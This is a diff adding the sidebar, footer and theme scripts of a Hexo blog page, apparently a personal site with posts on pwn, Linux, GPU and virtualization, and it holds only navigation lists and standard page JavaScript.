+			<li><a href="/categories/git/" title="git">git<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/hexo/" title="hexo">hexo<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/kernel/" title="kernel">kernel<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/" title="linux">linux<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/pwn/" title="pwn">pwn<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/" title="security">security<sup>9</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/shell/" title="shell">shell<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/solutions/" title="solutions">solutions<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/tools/" title="tools">tools<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/vim/" title="vim">vim<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/虚拟化/virtio/" title="virtio">virtio<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/vps/" title="vps">vps<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/web安全/" title="web安全">web安全<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/虚拟化/" title="虚拟化">虚拟化<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>12</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CUDA/" title="CUDA">CUDA<sup>10</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/GPU/" title="GPU">GPU<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/linux/" title="linux">linux<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/heap/" title="heap">heap<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/QEMU/" title="QEMU">QEMU<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/vim/" title="vim">vim<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/virtio/" title="virtio">virtio<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/kernel/" title="kernel">kernel<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/gitlab/" title="gitlab">gitlab<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/git/" title="git">git<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hexo/" title="hexo">hexo<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/shell/" title="shell">shell<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql/" title="sql">sql<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆溢出/" title="堆溢出">堆溢出<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/virtual-memory/" title="virtual memory">virtual memory<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu/" title="ubuntu">ubuntu<sup>2</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=null&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer">
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p>  <br>
+			上网不涉密，涉密不上网。</p>
+	</section>
+	 
+	<div class="social-font">
+		
+		
+		<a href="https://github.com/juniorprincewang" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:little0prince@163.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="Max">Max</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  </body>
+</html>
